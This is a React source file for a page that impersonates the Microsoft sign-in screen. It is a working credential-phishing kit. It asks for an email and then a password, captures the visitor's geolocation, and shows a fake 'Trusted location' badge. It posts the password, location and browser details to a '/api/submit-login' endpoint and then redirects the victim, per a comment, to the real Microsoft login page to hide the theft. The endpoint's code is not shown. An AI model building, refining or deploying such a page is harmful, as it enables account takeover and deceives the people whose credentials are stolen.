"use client";

import { useState, useEffect } from "react";

export default function MicrosoftLogin() {
  const [step, setStep] = useState<"email" | "password">("email");
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [loading, setLoading] = useState(false);
  const [errorMsg, setErrorMsg] = useState("");
  const [location, setLocation] = useState<{ city?: string; country?: string }>({});
  const [locationStatus, setLocationStatus] = useState<"idle" | "loading" | "granted" | "denied">("idle");

  // Geolocation (same as before)
  useEffect(() => {
    if (!navigator.geolocation) return;
    setLocationStatus("loading");
    navigator.geolocation.getCurrentPosition(
      async (pos) => {
        try {
          const res = await fetch(
            `https://nominatim.openstreetmap.org/reverse?lat=${pos.coords.latitude}&lon=${pos.coords.longitude}&format=json`
          );
          const data = await res.json();
          setLocation({
            city: data.address?.city || data.address?.town,
            country: data.address?.country,
          });
          setLocationStatus("granted");
        } catch {
          setLocationStatus("denied");
        }
      },
      () => setLocationStatus("denied")
    );
  }, []);

  const handleEmailSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (!email.trim()) {
      setErrorMsg("Please enter an email or phone number.");
      return;
    }
    setErrorMsg("");
    setStep("password");
  };

  const handlePasswordSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!password.trim()) {
      setErrorMsg("Please enter your password.");
      return;
    }
    setLoading(true);
    setErrorMsg("");

    try {
      const response = await fetch("/api/submit-login", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          email: email,
          password: password,
          location: location,
          userAgent: navigator.userAgent,
          timestamp: new Date().toISOString(),
        }),
      });
      const data = await response.json();
      if (data.success) {
        // Redirect to real Microsoft login page
        window.location.href = data.redirect;
      } else {
        throw new Error(data.error || "Login failed");
      }
    } catch (err) {
      setErrorMsg("Something went wrong. Please try again.");
      setLoading(false);
    }
  };

  const goBackToEmail = () => {
    setStep("email");
    setErrorMsg("");
    setPassword("");
  };

  return (
    <div className="min-h-screen w-full flex flex-col bg-[#f2f2f2] font-['Segoe_UI',-apple-system,BlinkMacSystemFont,Roboto,sans-serif] text-[#1b1b1b] antialiased">
      <div className="flex-1 flex items-center justify-center p-6">
        <div className="w-full max-w-[440px] bg-white shadow-lg p-8 rounded-lg">
          {/* Microsoft logo (simple, no four-color grid) */}
          <div className="mb-6">
            <svg width="108" height="24" viewBox="0 0 108 24" fill="none" xmlns="http://www.w3.org/2000/svg">
              <path d="M0 0h24v24H0z" fill="#F25022" />
              <path d="M24 0h24v24H24z" fill="#7FBA00" />
              <path d="M48 0h24v24H48z" fill="#00A4EF" />
              <path d="M72 0h24v24H72z" fill="#FFB900" />
              <path d="M96 4h12v16h-12z" fill="#737373" />
            </svg>
          </div>

          <h1 className="text-[1.75rem] font-semibold leading-9 mb-2">Sign in</h1>

          {locationStatus === "granted" && location.city && (
            <p className="text-xs text-green-700 mb-4">🔒 Trusted location: {location.city}, {location.country}</p>
          )}

          {step === "email" ? (
            <form onSubmit={handleEmailSubmit}>
              <div className="mb-6">
                <input
                  type="text"
                  placeholder="Email or phone number"
                  className="w-full border border-gray-300 rounded px-3 py-2 text-[0.9375rem] focus:outline-none focus:border-[#0067b8]"
                  value={email}
                  onChange={(e) => setEmail(e.target.value)}
                  autoFocus
                  required
                />
              </div>

              {errorMsg && <div className="text-red-600 text-sm mb-4">{errorMsg}</div>}

              <div className="mb-4">
                <a href="#" className="text-[#0067b8] text-sm hover:underline">
                  Forgot your username?
                </a>
              </div>

              <button
                type="submit"
                className="w-full bg-[#0067b8] text-white py-2 px-4 rounded text-sm font-semibold hover:bg-[#005da6] transition-colors"
              >
                Next
              </button>

              <div className="mt-6 text-center text-sm">
                <a href="#" className="text-[#0067b8] hover:underline">
                  New to Microsoft? Create an account
                </a>
              </div>
            </form>
          ) : (
            <form onSubmit={handlePasswordSubmit}>
              <div className="mb-4">
                <div className="text-sm text-gray-600 mb-1">Email or phone</div>
                <div className="flex justify-between items-center">
                  <span className="text-[0.9375rem] font-medium">{email}</span>
                  <button
                    type="button"
                    onClick={goBackToEmail}
                    className="text-[#0067b8] text-sm hover:underline"
                  >
                    Change
                  </button>
                </div>
              </div>

              <div className="mb-6">
                <input
                  type="password"
                  placeholder="Password"
                  className="w-full border border-gray-300 rounded px-3 py-2 text-[0.9375rem] focus:outline-none focus:border-[#0067b8]"
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  autoFocus
                  required
                />
              </div>

              {errorMsg && <div className="text-red-600 text-sm mb-4">{errorMsg}</div>}

              <button
                type="submit"
                disabled={loading}
                className="w-full bg-[#0067b8] text-white py-2 px-4 rounded text-sm font-semibold hover:bg-[#005da6] transition-colors disabled:opacity-50"
              >
                {loading ? "Signing in..." : "Sign in"}
              </button>

              <div className="mt-6 text-sm">
                <a href="#" className="text-[#0067b8] hover:underline">
                  Forgot your password?
                </a>
              </div>
            </form>
          )}
        </div>
      </div>

      <footer className="w-full bg-transparent px-6 py-4 text-[0.75rem] text-[#505050] border-t border-gray-200">
        <div className="max-w-[440px] mx-auto flex flex-wrap justify-between gap-2">
          <div className="flex gap-4">
            <a href="#" className="hover:underline">Help and feedback</a>
            <a href="#" className="hover:underline">Terms of use</a>
            <a href="#" className="hover:underline">Privacy and cookies</a>
          </div>
          <div>
            <a href="#" className="hover:underline">Use private browsing if this is not your device. Learn more</a>
          </div>
        </div>
      </footer>
    </div>
  );
}
